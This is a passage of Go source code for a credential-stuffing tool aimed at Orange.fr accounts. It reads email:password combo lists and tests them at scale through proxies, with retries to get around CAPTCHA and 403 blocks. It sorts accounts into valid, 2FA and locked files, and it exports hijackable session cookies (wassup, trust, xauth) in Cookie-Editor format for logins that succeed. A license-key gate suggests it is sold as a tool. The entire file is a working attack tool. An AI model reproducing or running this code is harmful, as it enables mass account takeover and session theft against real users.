		raw = raw[:cut]
	}
	if len(raw) < 14 {
		return nil
	}
	t, err := time.ParseInLocation("20060102150405", raw[:14], time.UTC)
	if err != nil {
		return nil
	}
	exp := float64(t.Unix())
	return &exp
}

func loginCookieEntry(name, domain string, hostOnly bool, value string) cookieEditorEntry {
	entry := cookieEditorEntry{
		Domain:   domain,
		HostOnly: hostOnly,
		HttpOnly: true,
		Name:     name,
		Path:     "/",
		SameSite: "lax",
		Secure:   true,
		StoreID:  "0",
		Value:    value,
	}
	if exp := wassupExpirationDate(value); exp != nil {
		entry.ExpirationDate = exp
	} else {
		entry.Session = true
	}
	return entry
}

func (s *orangeHTTPSession) findCookieByName(name string) *http.Cookie {
	for _, c := range s.collectOrangeCookies() {
		if c.Name == name && c.Value != "" {
			copy := *c
			return &copy
		}
	}
	return nil
}

func (s *orangeHTTPSession) findWassupCookie() *http.Cookie {
	return s.findCookieByName("wassup")
}

func (s *orangeHTTPSession) exportLoginCookiesJSON() (string, error) {
	wassup := s.findWassupCookie()
	if wassup == nil {
		return "", nil
	}

	var entries []cookieEditorEntry
	if trust := s.findCookieByName("trust"); trust != nil {
		entries = append(entries, toCookieEditorEntry(trust))
	}
	if xauth := s.findCookieByName("xauth"); xauth != nil {
		entries = append(entries, toCookieEditorEntry(xauth))
	}
	entries = append(entries,
		loginCookieEntry("wassup", "r.orange.fr", true, wassup.Value),
		loginCookieEntry("wassup", "login.orange.fr", true, wassup.Value),
		loginCookieEntry("wassup", ".orange.fr", false, wassup.Value),
	)
	raw, err := json.Marshal(entries)
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

func (s *orangeHTTPSession) exportOrangeCookieInfo() (count int, names []string) {
	if s.findWassupCookie() == nil {
		return 0, nil
	}
	if trust := s.findCookieByName("trust"); trust != nil {
		names = append(names, "trust@"+cookieDomainLabel(trust))
	}
	if xauth := s.findCookieByName("xauth"); xauth != nil {
		names = append(names, "xauth@"+cookieDomainLabel(xauth))
	}
	names = append(names, "wassup@r.orange.fr", "wassup@login.orange.fr", "wassup@.orange.fr")
	return len(names), names
}

func cookieDomainLabel(c *http.Cookie) string {
	if c == nil || c.Domain == "" {
		return "orange.fr"
	}
	return c.Domain
}

func missingSessionCookies(session *orangeHTTPSession) string {
	if session.findWassupCookie() == nil {
		return "wassup"
	}
	return ""
}

func (s *orangeHTTPSession) exportOrangeCookiesJSON() (string, error) {
	return s.exportLoginCookiesJSON()
}

type cookieEditorEntry struct {
	Domain         string   `json:"domain"`
	ExpirationDate *float64 `json:"expirationDate,omitempty"`
	HostOnly       bool     `json:"hostOnly"`
	HttpOnly       bool     `json:"httpOnly"`
	Name           string   `json:"name"`
	Path           string   `json:"path"`
	SameSite       string   `json:"sameSite"`
	Secure         bool     `json:"secure"`
	Session        bool     `json:"session"`
	StoreID        string   `json:"storeId"`
	Value          string   `json:"value"`
}

func sameSiteForCookieEditor(c *http.Cookie) string {
	switch c.SameSite {
	case http.SameSiteStrictMode:
		return "strict"
	case http.SameSiteLaxMode:
		return "lax"
	case http.SameSiteNoneMode:
		return "no_restriction"
	default:
		return "unspecified"
	}
}

func (s *orangeHTTPSession) collectOrangeCookies() []*http.Cookie {
	hosts := []string{
		"https://login.orange.fr/",
		"https://r.orange.fr/",
		"https://www.orange.fr/",
		"https://orange.fr/",
		"https://.orange.fr/",
	}
	seen := map[string]struct{}{}
	var cookies []*http.Cookie
	for _, host := range hosts {
		u, err := url.Parse(host)
		if err != nil {
			continue
		}
		for _, c := range s.client.Jar.Cookies(u) {
			if c.Value == "" {
				continue
			}
			domain := c.Domain
			if domain == "" {
				domain = u.Host
			}
			path := c.Path
			if path == "" {
				path = "/"
			}
			key := c.Name + "\x00" + domain + "\x00" + path
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			copy := *c
			copy.Domain = domain
			copy.Path = path
			cookies = append(cookies, &copy)
		}
	}
	return cookies
}

func toCookieEditorEntry(c *http.Cookie) cookieEditorEntry {
	domain := c.Domain
	hostOnly := !strings.HasPrefix(domain, ".")
	if domain == "" {
		domain = "orange.fr"
		hostOnly = true
	}
	path := c.Path
	if path == "" {
		path = "/"
	}
	entry := cookieEditorEntry{
		Domain:   domain,
		HostOnly: hostOnly,
		HttpOnly: c.HttpOnly,
		Name:     c.Name,
		Path:     path,
		SameSite: sameSiteForCookieEditor(c),
		Secure:   c.Secure,
		StoreID:  "0",
		Value:    c.Value,
	}
	if c.MaxAge < 0 || (c.Expires.IsZero() && c.MaxAge == 0) {
		entry.Session = true
	} else if !c.Expires.IsZero() {
		exp := float64(c.Expires.Unix())
		entry.ExpirationDate = &exp
	} else if c.MaxAge > 0 {
		exp := float64(time.Now().Add(time.Duration(c.MaxAge) * time.Second).Unix())
		entry.ExpirationDate = &exp
	} else {
		entry.Session = true
	}
	return entry
}

func (s *orangeHTTPSession) finalizeLoginSession(finalURL string) {
	referer := base + "/"
	targets := []string{
		finalURL,
		"https://r.orange.fr/r/Oid_accueil",
		"https://www.orange.fr/portail",
	}
	for _, target := range targets {
		if target == "" {
			continue
		}
		_, _, _, _ = s.request("GET", target, s.navigateHeaders(referer), nil, nil)
		referer = target
	}
}

func (s *orangeHTTPSession) captureValidSessionCookies(location string) (finalURL string, hops []string, cookiesJSON string, cookieCount int, cookieNames []string, err error) {
	if location != "" {
		finalURL, hops, err = s.followRedirectChain(location)
		if err != nil {
			if cookiesJSON, exportErr := s.exportOrangeCookiesJSON(); exportErr == nil && cookiesJSON != "" {
				s.finalizeLoginSession("")
				cookieCount, cookieNames = s.exportOrangeCookieInfo()
				return finalURL, hops, cookiesJSON, cookieCount, cookieNames, nil
			}
			return finalURL, hops, "", 0, nil, err
		}
	}
	s.finalizeLoginSession(finalURL)
	cookieCount, cookieNames = s.exportOrangeCookieInfo()
	cookiesJSON, err = s.exportOrangeCookiesJSON()
	if err != nil {
		return finalURL, hops, "", cookieCount, cookieNames, err
	}
	return finalURL, hops, cookiesJSON, cookieCount, cookieNames, nil
}

func formatComboLine(email, password string) string {
	return email + ":" + password
}

func formatValidLine(email, password, cookiesJSON string) string {
	return email + ":" + password + " | " + cookiesJSON
}

func redirectLocation(data map[string]interface{}) string {
	dataField := asMap(data["data"])
	if dataField == nil {
		return ""
	}
	return asString(dataField["location"])
}

func is2FARedirect(data map[string]interface{}) bool {
	loc := redirectLocation(data)
	return strings.Contains(loc, "/recovery") || strings.Contains(loc, "/mdp")
}

type combo struct {
	email    string
	password string
}

func loadCombos(path string) ([]combo, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var combos []combo
	scanner := bufio.NewScanner(f)
	lineNo := 0
	for scanner.Scan() {
		lineNo++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		email, password, ok := strings.Cut(line, ":")
		if !ok || strings.TrimSpace(email) == "" || password == "" {
			return nil, fmt.Errorf("%s:%d: expected email:password", path, lineNo)
		}
		combos = append(combos, combo{
			email:    strings.TrimSpace(email),
			password: password,
		})
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	if len(combos) == 0 {
		return nil, fmt.Errorf("%s: no combos found", path)
	}
	return combos, nil
}

var resultFileMu sync.Mutex

type asyncResultWriter struct {
	ch   chan resultWrite
	done chan struct{}
}

type resultWrite struct {
	path string
	line string
}

func newAsyncResultWriter() *asyncResultWriter {
	w := &asyncResultWriter{
		ch:   make(chan resultWrite, 8192),
		done: make(chan struct{}),
	}
	go func() {
		defer close(w.done)
		files := make(map[string]*os.File)
		defer func() {
			for _, f := range files {
				_ = f.Close()
			}
		}()
		for job := range w.ch {
			f, ok := files[job.path]
			if !ok {
				var err error
				f, err = os.OpenFile(job.path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					continue
				}
				files[job.path] = f
			}
			_, _ = fmt.Fprintln(f, job.line)
		}
	}()
	return w
}

func (w *asyncResultWriter) write(path, line string) {
	w.ch <- resultWrite{path: path, line: line}
}

func (w *asyncResultWriter) close() {
	close(w.ch)
	<-w.done
}

func appendLine(path, line string) error {
	resultFileMu.Lock()
	defer resultFileMu.Unlock()
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = fmt.Fprintln(f, line)
	return err
}

func resetResultFiles() error {
	if err := os.MkdirAll(resultDir, 0755); err != nil {
		return err
	}

	seen := map[string]struct{}{
		validFile:          {},
		changePasswordFile: {},
		invalidFile:        {},
		limitedFile:        {},
		captchaFile:        {},
		twofaFile:          {},
	}
	paths := []string{validFile, changePasswordFile, invalidFile, limitedFile, captchaFile, twofaFile}

	entries, err := os.ReadDir(resultDir)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(strings.ToLower(entry.Name()), ".txt") {
			continue
		}
		path := filepath.Join(resultDir, entry.Name())
		if _, ok := seen[path]; ok {
			continue
		}
		seen[path] = struct{}{}
		paths = append(paths, path)
	}

	for _, path := range paths {
		if err := os.WriteFile(path, nil, 0644); err != nil {
			return err
		}
	}
	return nil
}

type comboResult struct {
	loginStatus     int
	passStatus      int
	proxyIP         string
	label           string
	detail          string
	valid           bool
	changePassword  bool
	credentialIssue bool
	limited         bool
	twoFA           bool
	cookies         string
}

type comboJob struct {
	total int
	combo combo
}

type runCounts struct {
	valid    int64
	changePW int64
	invalid  int64
	limited  int64
	captcha  int64
	twofa    int64
}

func isRealCaptchaMsg(msg string) bool {
	m := strings.ToLower(msg)
	return strings.Contains(m, "captcha.orange.fr") || strings.Contains(m, "captcha required")
}

func isSecurityBlockMsg(msg string) bool {
	if msg == "" {
		return false
	}
	return isRealCaptchaMsg(msg) || isOrange403Block(msg) || isCookieCaptureBlockDetail(msg)
}

func (r comboResult) isSecurityBlock() bool {
	if r.valid || r.credentialIssue || r.limited || r.twoFA || r.changePassword {
		return false
	}
	if isPoolStoppedResult(r) {
		return false
	}
	if r.label == "CAPTCHA" || r.label == "PROXY" {
		return true
	}
	return isServerErrorResult(r) || isSecurityBlockMsg(r.detail)
}

func captchaBlockResult(session *orangeHTTPSession, loginStatus, passStatus int, detail string) comboResult {
	return withProxyIP(session, comboResult{
		loginStatus: loginStatus,
		passStatus:  passStatus,
		label:       "CAPTCHA",
		detail:      detail,
	})
}

func isProxyMsg(msg string) bool {
	m := strings.ToLower(msg)
	return strings.Contains(m, "timeout") ||
		strings.Contains(m, "eof") ||
		strings.Contains(m, "connection reset") ||
		strings.Contains(m, "connection refused") ||
		strings.Contains(m, "tls:") ||
		strings.Contains(m, "no such host") ||
		strings.Contains(m, "idzone.js url not found") ||
		strings.Contains(m, "/api/access failed")
}

func classifyErrLabel(err error) string {
	if err == nil {
		return "PROXY"
	}
	msg := err.Error()
	if isRealCaptchaMsg(msg) {
		return "CAPTCHA"
	}
	if isRetryableNetErr(err) || isProxyMsg(msg) {
		return "PROXY"
	}
	return "PROXY"
}

func withProxyIP(session *orangeHTTPSession, r comboResult) comboResult {
	if session != nil {
		if ip := session.getProxyIP(); ip != "" {
			r.proxyIP = ip
		}
	}
	return r
}

type sessionPool struct {
	transport *http.Transport
	ready     chan *orangeHTTPSession
	stop      chan struct{}
	stopOnce  sync.Once
}

func newSessionPool(transport *http.Transport) *sessionPool {
	sp := &sessionPool{
		transport: transport,
		ready:     make(chan *orangeHTTPSession, sessionPoolSize),
		stop:      make(chan struct{}),
	}
	for i := 0; i < workerCount; i++ {
		go sp.bootstrapLoop()
	}
	return sp
}

func (sp *sessionPool) bootstrapLoop() {
	for {
		select {
		case <-sp.stop:
			return
		default:
		}
		session, err := newOrangeHTTPSession(quietLog(), sp.transport)
		if err != nil {
			continue
		}
		if err := session.bootstrap(); err != nil {
			continue
		}

		ready := false
		for attempt := 1; attempt <= maxSameIPTry; attempt++ {
			access, err := session.access()
			if err != nil {
				break
			}
			if access.nextStep == "login" {
				ready = true
				break
			}
		}
		if !ready {
			continue
		}

		select {
		case sp.ready <- session:
		case <-sp.stop:
			return
		}
	}
}

func (sp *sessionPool) acquire() (*orangeHTTPSession, error) {
	select {
	case s := <-sp.ready:
		return s, nil
	case <-sp.stop:
		return nil, errors.New("session pool stopped")
	}
}

func (sp *sessionPool) close() {
	sp.stopOnce.Do(func() { close(sp.stop) })
}

func isPoolStoppedResult(r comboResult) bool {
	return strings.Contains(strings.ToLower(r.detail), "session pool stopped") ||
		strings.Contains(r.detail, "No ready session available in pool")
}

func printSummary(
	l *log,
	checked int64,
	totalCombos int,
	firstCheckAt time.Time,
	counts runCounts,
) {
	elapsed := 0
	cpm := 0
	if checked > 0 && !firstCheckAt.IsZero() {
		elapsed = int(time.Since(firstCheckAt).Seconds())
		if elapsed < 1 {
			elapsed = 1
		}
		cpm = calcCPM(checked, elapsed)
	}
	l.progressLine(checked, int64(totalCombos), elapsed, cpm, counts, true)
}

func is2FAStep(nextStep string) bool {
	return nextStep == "mobileConnect" || nextStep == "authnByApp"
}

func isOrange403Block(msg string) bool {
	m := strings.ToLower(msg)
	return strings.Contains(m, "error403") ||
		strings.Contains(m, "oerreur_403") ||
		strings.Contains(m, "http 403") ||
		strings.Contains(m, "blocked by orange (403")
}

func isCookieCaptureBlockDetail(detail string) bool {
	d := strings.ToLower(detail)
	return strings.Contains(d, "cookie capture failed") && isOrange403Block(d)
}

func isOerreur403Redirect(data map[string]interface{}) bool {
	dataField := asMap(data["data"])
	if dataField == nil {
		return false
	}
	return strings.Contains(asString(dataField["location"]), "Oerreur_403")
}

func isTransientLoginBlock(status int) bool {
	return status == 403
}

func isServerError(status int) bool {
	return status == 500
}

func isServerErrorResult(r comboResult) bool {
	return isServerError(r.loginStatus) || isServerError(r.passStatus)
}

func (r comboResult) shouldRetry() bool {
	return r.isSecurityBlock()
}

func calcCPM(checked int64, elapsedSec int) int {
	if elapsedSec <= 0 {
		return 0
	}
	return int(checked * 60 / int64(elapsedSec))
}

func maxComboAttempts(r comboResult) int {
	if r.isSecurityBlock() {
		return comboRetrySecurity
	}
	return 1
}

func checkCombo(pool *sessionPool, email, password string) comboResult {
	var last comboResult
	for attempt := 0; ; attempt++ {
		last = checkComboOnce(pool, email, password)
		if !last.shouldRetry() {
			return last
		}
		if attempt+1 >= maxComboAttempts(last) {
			last.label = "CAPTCHA"
			last.detail = "security block retry exhausted: " + last.detail
			return last
		}
		time.Sleep(requestRetryDelay)
	}
}

func checkComboOnce(pool *sessionPool, email, password string) comboResult {
	session, err := pool.acquire()
	if err != nil {
		return captchaBlockResult(nil, 0, 0, err.Error())
	}

	loginStatus, loginData := session.login(email)
	if errMsg := asString(loginData["error"]); errMsg != "" && loginStatus == 0 {
		return captchaBlockResult(session, loginStatus, 0, errMsg)
	}
	loginNext := asString(loginData["nextStep"])
	if isServerError(loginStatus) {
		return captchaBlockResult(session, loginStatus, 0, serverErrorDetail("Login", loginStatus, loginData))
	}
	if isTransientLoginBlock(loginStatus) {
		return captchaBlockResult(session, loginStatus, 0, apiDetail(loginData, loginNext, loginStatus))
	}
	if loginNext != "password" {
		detail := apiDetail(loginData, loginNext, loginStatus)
		if isSecurityBlockMsg(detail) {
			return captchaBlockResult(session, loginStatus, 0, detail)
		}
		if is2FARedirect(loginData) {
			return withProxyIP(session, comboResult{
				loginStatus: loginStatus, label: "2FA", detail: detail, twoFA: true,
			})
		}
		if isOerreur403Redirect(loginData) {
			return captchaBlockResult(session, loginStatus, 0, detail)
		}
		label := "INVALID"
		switch loginNext {
		case "mobileConnect", "authnByApp":
			return withProxyIP(session, comboResult{
				loginStatus: loginStatus, label: "2FA", detail: detail, twoFA: true,
			})
		case "feedback":
			return withProxyIP(session, comboResult{
				loginStatus: loginStatus, label: "INVALID", detail: detail, credentialIssue: true,
			})
		case "login":
			if loginStatus == 401 {
				return withProxyIP(session, comboResult{
					loginStatus: loginStatus, label: "INVALID", detail: detail, credentialIssue: true,
				})
			}
		}
		return withProxyIP(session, comboResult{loginStatus: loginStatus, label: label, detail: detail})
	}

	passStatus, passData := session.password(password)
	if errMsg := asString(passData["error"]); errMsg != "" && passStatus == 0 {
		return captchaBlockResult(session, loginStatus, passStatus, errMsg)
	}
	passNext := asString(passData["nextStep"])
	location := redirectLocation(passData)
	detail := apiDetail(passData, passNext, passStatus)
	if location != "" && extractError(passData) == "" {
		detail = englishAPIError("redirect -> " + location)
	}
	if isServerError(passStatus) {
		return captchaBlockResult(session, loginStatus, passStatus, serverErrorDetail("Password", passStatus, passData))
	}

	if loginStatus == 200 && passStatus == 200 {
		base := func() comboResult {
			return comboResult{loginStatus: loginStatus, passStatus: passStatus}
		}
		if isSecurityBlockMsg(detail) {
			return captchaBlockResult(session, loginStatus, passStatus, detail)
		}
		if passNext == "promoteAccess" {
			r := base()
			r.label = "CHANGE_PW"
			r.detail = detail
			r.changePassword = true
			return withProxyIP(session, r)
		}
		if is2FAStep(passNext) || is2FARedirect(passData) {
			r := base()
			r.label = "2FA"
			r.detail = detail
			r.twoFA = true
			return withProxyIP(session, r)
		}
		_, _, cookiesJSON, _, _, _ := session.captureValidSessionCookies(location)
		if cookiesJSON != "" {
			r := base()
			r.label = "VALID"
			r.detail = detail
			r.valid = true
			r.cookies = cookiesJSON
			return withProxyIP(session, r)
		}
		r := base()
		r.label = "2FA"
		r.detail = detail
		r.twoFA = true
		return withProxyIP(session, r)
	}

	if isSecurityBlockMsg(detail) {
		return captchaBlockResult(session, loginStatus, passStatus, detail)
	}
	if is2FAStep(passNext) {
		return withProxyIP(session, comboResult{
			loginStatus: loginStatus,
			passStatus:  passStatus,
			label:       "2FA",
			detail:      detail,
			twoFA:       true,
		})
	}
	if loginStatus == 200 && passStatus == 403 {
		return withProxyIP(session, comboResult{
			loginStatus: loginStatus,
			passStatus:  passStatus,
			label:       "LIMITED",
			detail:      englishAPIError(extractError(passData)),
			limited:     true,
		})
	}
	label := "INVALID"
	credentialIssue := false
	if passStatus == 401 && passNext == "password" {
		credentialIssue = true
	}

	result := comboResult{
		loginStatus:     loginStatus,
		passStatus:      passStatus,
		label:           label,
		detail:          detail,
		credentialIssue: credentialIssue,
	}
	return withProxyIP(session, result)
}

func (r comboResult) isChangePassword() bool {
	return r.changePassword
}

func (r comboResult) isValid() bool {
	return r.valid
}

func (r comboResult) credentialInvalid() bool {
	return r.credentialIssue
}

func (r comboResult) isLimited() bool {
	return r.limited
}

func (r comboResult) is2FA() bool {
	return r.twoFA
}

func main() {
	if isLicenseGenBinary() {
		runLicenseGenCLI()
		return
	}

	l := newLog()

	l.startupHeader()

	if err := requireLicense(l); err != nil {
		l.fail("license: " + err.Error())
		os.Exit(2)
	}

	proxy, err := requireProxy(l)
	if err != nil {
		l.fail("proxy: " + err.Error())
		os.Exit(2)
	}

	workerCount, err = workersFromEnv()
	if err != nil {
		l.fail("workers: " + err.Error())
		os.Exit(2)
	}
	sessionPoolSize = workerCount * 2

	combos, err := loadCombos(combosFile)
	if err != nil {
		l.fail(err.Error())
		os.Exit(2)
	}
	l.startup(
		"combos",
		fmt.Sprintf("%s%d%s %s%s", cYellow+cBold, len(combos), cReset+cWhite, cGray, combosFile),
		cCyan,
		"",
	)

	if err := resetResultFiles(); err != nil {
		l.fail("reset result files: " + err.Error())
		os.Exit(2)
	}
	l.startup("result", "cleared result/*.txt", cGray, cGreen)
	l.startup("workers", fmt.Sprintf("%d", workerCount), cMagenta, cYellow+cBold)
	l.startup("pool", fmt.Sprintf("%d bootstrappers / %d buffer", workerCount, sessionPoolSize), cMagenta, cYellow)
	l.startupFooter()

	transport := newSharedTransport(proxy)
	pool := newSessionPool(transport)
	defer pool.close()
	results := newAsyncResultWriter()
	defer results.close()

	type countResult = runCounts
	var counts countResult
	var checked int64
	var firstCheckOnce sync.Once
	var firstCheckAt time.Time
	markFirstCheck := func() {
		firstCheckOnce.Do(func() {
			firstCheckAt = time.Now()
		})
	}
	elapsedSinceFirstCheck := func() int {
		if firstCheckAt.IsZero() {
			return 0
		}
		elapsed := int(time.Since(firstCheckAt).Seconds())
		if elapsed < 1 {
			return 1
		}
		return elapsed
	}

	jobs := make(chan comboJob, workerCount)
	var wg sync.WaitGroup
	var stopping atomic.Bool
	var interrupted atomic.Bool
	var shutdownOnce sync.Once

	requestShutdown := func() {
		shutdownOnce.Do(func() {
			interrupted.Store(true)
			stopping.Store(true)
			pool.close()
			l.emit("\n")
		})
	}

	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		requestShutdown()
		<-sigCh
		os.Exit(130)
	}()

	statsStop := make(chan struct{})
	var statsWG sync.WaitGroup
	statsWG.Add(1)
	go func() {
		defer statsWG.Done()
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-statsStop:
				return
			case <-ticker.C:
				n := atomic.LoadInt64(&checked)
				if n == 0 {
					continue
				}
				snap := loadRunCounts(&counts)
				elapsed := elapsedSinceFirstCheck()
				l.progressLine(n, int64(len(combos)), elapsed, calcCPM(n, elapsed), snap, false)
			}
		}
	}()

	for w := 0; w < workerCount; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				res := checkCombo(pool, job.combo.email, job.combo.password)
				if isPoolStoppedResult(res) {
					continue
				}
				atomic.AddInt64(&checked, 1)
				markFirstCheck()

				line := formatComboLine(job.combo.email, job.combo.password)
				if res.isValid() {
					atomic.AddInt64(&counts.valid, 1)
					results.write(validFile, formatValidLine(job.combo.email, job.combo.password, res.cookies))
				} else if res.isChangePassword() {
					atomic.AddInt64(&counts.changePW, 1)
					results.write(changePasswordFile, line)
				} else if res.isLimited() {
					atomic.AddInt64(&counts.limited, 1)
					results.write(limitedFile, job.combo.email+":"+job.combo.password)
				} else if res.credentialInvalid() {
					atomic.AddInt64(&counts.invalid, 1)
					results.write(invalidFile, job.combo.email+":"+job.combo.password)
				} else if res.is2FA() {
					atomic.AddInt64(&counts.twofa, 1)
					results.write(twofaFile, job.combo.email+":"+job.combo.password)
				} else {
					atomic.AddInt64(&counts.captcha, 1)
					results.write(captchaFile, job.combo.email+":"+job.combo.password)
				}
			}
		}()
	}

	go func() {
		for _, c := range combos {
			if stopping.Load() {
				break
			}
			jobs <- comboJob{total: len(combos), combo: c}
		}
		close(jobs)
	}()

	wg.Wait()
	close(statsStop)
	statsWG.Wait()
	printSummary(l, checked, len(combos), firstCheckAt, loadRunCounts(&counts))

	if counts.valid > 0 || counts.changePW > 0 {
		os.Exit(0)
	}
	if interrupted.Load() {
		os.Exit(130)
	}
	os.Exit(1)
}
